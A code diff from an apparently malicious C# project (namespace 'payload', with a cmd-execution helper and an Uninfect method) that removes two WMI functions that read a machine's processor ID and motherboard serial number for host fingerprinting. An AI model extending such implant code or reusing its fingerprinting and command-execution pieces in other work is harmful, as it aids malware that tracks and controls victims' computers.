@@ -4,8 +4,6 @@ using System.Diagnostics;
 using System.Globalization;
 using System.IO;
 using System.IO.Compression;
-using System.Linq;
-using System.Management;
 using System.Net;
 
 using Newtonsoft.Json;
@@ -61,32 +59,6 @@ namespace payload
             string output = cmdproc.StandardOutput.ReadToEnd();
             cmdproc.WaitForExit();
             return output;
-        }
-
-        public static string GetProcessorId()
-        {
-            string id = string.Empty;
-            try
-            {
-                ManagementObjectSearcher searcher = new ManagementObjectSearcher("Select * From Win32_processor");
-                id = searcher.Get().Cast<ManagementObject>().Select(x => x["ProcessorID"]).ToList()[0].ToString();
-                searcher.Dispose();
-            }
-            catch { }
-            return id;
-        }
-
-        public static string GetMotherboardSerialNum()
-        {
-            string id = string.Empty;
-            try
-            {
-                ManagementObjectSearcher searcher = new ManagementObjectSearcher("Select * From Win32_BaseBoard");
-                id = searcher.Get().Cast<ManagementObject>().Select(x => x["SerialNumber"]).ToList()[0].ToString();
-                searcher.Dispose();
-            }
-            catch { }
-            return id;
         }
 
         public static void Uninfect()
